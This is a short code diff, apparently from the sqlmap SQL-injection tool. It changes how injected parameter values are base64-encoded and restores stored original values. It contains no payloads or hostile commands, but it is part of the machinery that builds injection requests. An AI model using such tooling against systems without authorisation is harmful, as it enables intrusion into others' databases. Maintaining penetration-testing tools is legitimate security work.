@@ -183,8 +183,12 @@ class Agent(object):
                 newValue = self.adjustLateValues(newValue)
 
             # TODO: support for POST_HINT
-            newValue = encodeBase64(newValue, binary=False, encoding=conf.encoding or UNICODE_ENCODING)
-            origValue = encodeBase64(origValue, binary=False, encoding=conf.encoding or UNICODE_ENCODING)
+            newValue = encodeBase64(newValue, binary=False, encoding=conf.encoding or UNICODE_ENCODING, safe=conf.base64Safe)
+
+            if parameter in kb.base64Originals:
+                origValue = kb.base64Originals[parameter]
+            else:
+                origValue = encodeBase64(origValue, binary=False, encoding=conf.encoding or UNICODE_ENCODING)
 
         if place in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER):
             _ = "%s%s" % (origValue, kb.customInjectionMark)
